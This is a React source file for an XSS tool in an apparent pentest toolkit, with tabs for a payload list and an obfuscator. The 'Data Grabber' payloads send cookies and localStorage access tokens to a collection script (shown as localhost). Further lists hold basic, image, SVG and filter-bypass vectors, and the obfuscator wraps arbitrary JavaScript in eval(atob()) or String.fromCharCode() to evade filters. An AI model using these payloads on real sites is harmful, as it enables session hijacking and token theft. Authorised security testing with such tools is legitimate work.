import React, { useState } from 'react';
import { Card, TextArea, Button, Select, Tabs, PayloadBlock } from '../ui';
import { Copy, Check, ShieldAlert, Code } from 'lucide-react';

// --- Components for Internal Tabs ---

const XSSPayloads = () => {
    // Ported from legacy/web/XSS/XSSPayload.tsx
    const DataGrabber = [
        { title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>" },
        { title: "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>" },
        { title: "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>" },
        { title: "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>" },
    ];
    const BasicXSS = [
        { title: "<script>alert('XSS')</script>" },
        { title: "<scr<script>ipt>alert('XSS')</scr<script>ipt>" },
        { title: "\"><script>alert(\"XSS\")</script>" },
        { title: "\"><script>alert(String.fromCharCode(88,83,83))</script>" },
    ];
    const ImgPayload = [
        { title: "<img src=x onerror=alert('XSS');>" },
        { title: "<img src=x onerror=alert('XSS')//" },
        { title: "<img src=x onerror=alert(String.fromCharCode(88,83,83));>" },
        { title: "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>" },
        { title: "<img src=x:alert(alt) onerror=eval(src) alt=xss>" },
        { title: "\"><img src=x onerror=alert(\"XSS\");>" },
    ];
    const XSSSvg = [
        { title: "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>" },
        { title: "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>" },
        { title: "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>" },
    ];
    const BypassWord = [
        { title: "eval('ale'+'rt(0)');" },
        { title: "Function('ale'+'rt(1)')();" },
        { title: "new Function`alert`6``;" },
        { title: "setTimeout('ale'+'rt(2)');" },
        { title: "setInterval('ale'+'rt(10)');" },
    ];

    const PayloadSection = ({ title, payloads }: { title: string, payloads: { title: string }[] }) => (
        <div className="mb-6">
            <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
                {title}
            </h3>
            <PayloadBlock
                content={payloads.map(p => p.title).join('\n')}
            />
        </div>
    );

    return (
        <div className="space-y-6 animate-fadeIn">
            <PayloadSection title="Data Grabber" payloads={DataGrabber} />
            <PayloadSection title="Basic XSS" payloads={BasicXSS} />
            <PayloadSection title="Image Vectors" payloads={ImgPayload} />
            <PayloadSection title="SVG Vectors" payloads={XSSSvg} />
            <PayloadSection title="Filter Bypass" payloads={BypassWord} />
        </div>
    );
};

const XSSObfuscator = () => {
    const [input, setInput] = useState('');
    const [output, setOutput] = useState('');
    const [method, setMethod] = useState('base64');
    const [showToast, setShowToast] = useState(false);

    // Ported from legacy/web/XSS/XSSObfuscation.tsx
    const handleObfuscate = () => {
        if (!input) {
            setOutput('');
            return;
        }

        try {
            if (method === 'base64') {
                const obf = btoa(input);
                setOutput(`eval(atob('${obf}'))`);
            } else if (method === 'charcode') {
                const charObf = input
                    .split("")
                    .map((c) => c.charCodeAt(0))
                    .join(",");
                setOutput(`eval(String.fromCharCode(${charObf}))`);
            }
        } catch (e) {
            setOutput('Error generating payload');
        }
    };

    const copyToClipboard = () => {
        if (!output) return;
        navigator.clipboard.writeText(output);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    return (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 animate-fadeIn">
            <Card className="!p-6 space-y-4">
                <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Input JavaScript</h3>
                <TextArea
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    placeholder="alert('XSS')"
                    className="flex-1 min-h-[200px]"
                />
                <div className="flex gap-2">
                    <Select
                        className="flex-1"
                        value={method}
                        onChange={setMethod}
                        options={[
                            { label: 'Base64 Wrapper', value: 'base64' },
                            { label: 'String.fromCharCode', value: 'charcode' },
                        ]}
                    />
                    <Button onClick={handleObfuscate} icon={<Code size={16} />}>
                        Obfuscate
                    </Button>
                </div>
            </Card>

            <Card className="!p-6 space-y-4">
                <div className="flex items-center justify-between">
                    <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Obfuscated Output</h3>
                    <Button
                        size="sm"
                        variant={output ? 'primary' : 'secondary'}
                        disabled={!output}
                        onClick={copyToClipboard}
                        icon={<Copy size={14} />}
                    >
                        Copy
                    </Button>
                </div>
                <TextArea
                    readOnly
                    value={output}
                    placeholder="// Result will appear here..."
                    className="flex-1 min-h-[200px] text-orange-300"
                />
            </Card>

            {/* Toast */}
            <div className={`fixed bottom-6 left-1/2 -translate-x-1/2 bg-[#0d1117] border border-[#a2ff00] px-4 py-2 rounded-lg flex items-center gap-2 transition-all ${showToast ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
                <Check size={16} className="text-[#a2ff00]" />
                <span className="text-sm font-bold text-white">Copied!</span>
            </div>
        </div>
    );
};

export default function XSSTool() {
    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white flex items-center gap-2">
                    <ShieldAlert className="text-htb-green" size={24} />
                    Cross-Site Scripting (XSS)
                </h2>
                <p className="text-gray-400">
                    Interactive payload generator and obfuscator for XSS testing.
                </p>
            </div>

            <Tabs
                items={[
                    { id: 'payloads', label: 'Payloads', icon: <Code size={16} />, content: <XSSPayloads /> },
                    { id: 'obfuscator', label: 'Obfuscator', icon: <ShieldAlert size={16} />, content: <XSSObfuscator /> },
                ]}
            />
        </div>
    );
}
